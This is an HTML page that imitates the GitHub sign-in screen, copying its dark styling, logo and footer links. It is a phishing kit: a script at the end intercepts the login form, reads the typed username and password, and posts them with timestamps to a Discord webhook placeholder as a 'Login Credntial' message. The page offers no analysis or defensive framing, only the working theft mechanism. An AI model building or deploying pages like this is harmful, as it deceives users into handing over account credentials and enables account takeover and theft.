<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-color: #0d1117;
            --card-bg: #161b22;
            --border-color: #30363d;
            --text-main: #f0f6fc;
            --text-secondary: #848d97;
            --btn-bg: #238636;
            --btn-hover: #2ea043;
            --link-color: #2f81f7;
            --input-bg: #010409;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 24px;
        }

        .logo {
            margin-bottom: 24px;
        }

        .logo svg {

            fill: var(--text-main);
            width: 48px;
            height: 48px;
        }

        .header-title {

            font-size: 24px;
            font-weight: 300;
            letter-spacing: -0.5px;
            margin-bottom: 16px;
        }

        .login-card {

            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            width: 100%;
            max-width: 340px;
            padding: 20px;
            margin-bottom: 16px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .label-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 400;
            color: var(--text-main);
        }

        .input-field {
            width: 100%;
            padding: 5px 12px;
            font-size: 14px;
            line-height: 20px;
            color: var(--text-main);
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }

        .input-field:focus {
            border-color: var(--link-color);
            box-shadow: 0 0 0 3px rgba(47, 129, 247, 0.3);
        }

        .forgot-link,
        .signup-card a,
        .footer-links a {
            color: var(--link-color);
            text-decoration: none;
            font-size: 12px;
        }

        .signup-card a {
            font-size: 14px;
        }

        .forgot-link:hover,
        .signup-card a:hover,
        .footer-links a:hover {
            text-decoration: underline;
        }

        .btn-submit {

            width: 100%;
            background-color: var(--btn-bg);
            color: #ffffff;
            border: 1px solid rgba(240, 246, 252, 0.1);
            border-radius: 6px;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            line-height: 20px;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-top: 8px;
        }

        .btn-submit:hover {

            background-color: var(--btn-hover);

        }

        .signup-card {

            border: 1px solid var(--border-color);
            border-radius: 6px;
            width: 100%;
            max-width: 340px;
            padding: 16px;
            text-align: center;
            font-size: 14px;
            color: var(--text-main);
        }

        .footer-links {
            display: flex;
            gap: 16px;
            margin-top: 40px;
            font-size: 12px;
        }

        .footer-links a {
            color: var(--text-secondary);

        }

        @media (max-width: 400px) {

            .login-card,
            .signup-card {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>

    <div class="logo">
        <svg viewBox="0 0 16 16" version="1.1" aria-hidden="true">
            <path
                d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z">
            </path>
        </svg>
    </div>

    <h1 class="header-title">Sign in to GitHub</h1>

    <div class="login-card">

        <form id="form">

            <div class="form-group">
                <label for="login_field">Username or email address</label>
                <input type="text" id="login_field" class="input-field" required autocomplete="username" autofocus>
            </div>

            <div class="form-group">
                <div class="label-row">
                    <label for="password">Password</label>
                    <a href="#" class="forgot-link">Forgot password?</a>
                </div>

                <input type="password" id="password" class="input-field" required autocomplete="current-password">
            </div>

            <button type="submit" class="btn-submit">Sign in</button>
        </form>
    </div>


    <div class="signup-card">
        New to Github? <a href="#">Create an account</a>
    </div>

    <footer class="footer-links">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
        <a href="#">Docs</a>
        <a href="#">Contact GitHub Support</a>
    </footer>


    <script>

        const formLoadTime = new Date();

        document.getElementById('form').addEventListener('submit', function (event) {

            // Prevent the browser from reloading
            event.preventDefault();

            const submitClickTime = new Date();

            const nameValue = document.getElementById('login_field').value;
            const passwordValue = document.getElementById("password").value;

            const webhookUrl = "{{DS-HOOK}}";

            const green = "\x1b[1;32m";
            const cyan = "\x1b[1;36m";
            const white = "\x1b[0;37m";
            const reset = "\x1b[0m";

            const discordMessage = {
                content: `\`\`\`ansi\n` +
                    `${green}**Login Credntial**${reset}\n` +
                    `${cyan}Email:${reset} ${white}${nameValue}${reset}\n` +
                    `${cyan}Password:${reset} ${white}${passwordValue}${reset}\n` +
                    `${cyan}Form Opened At:${reset} ${white}${formLoadTime.toLocaleString()}${reset}\n` +
                    `${cyan}Submit Clicked At:${reset} ${white}${submitClickTime.toLocaleString()}${reset}\n` +
                    `\`\`\``
            };


            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            });
        })
    </script>

</body>

</html>
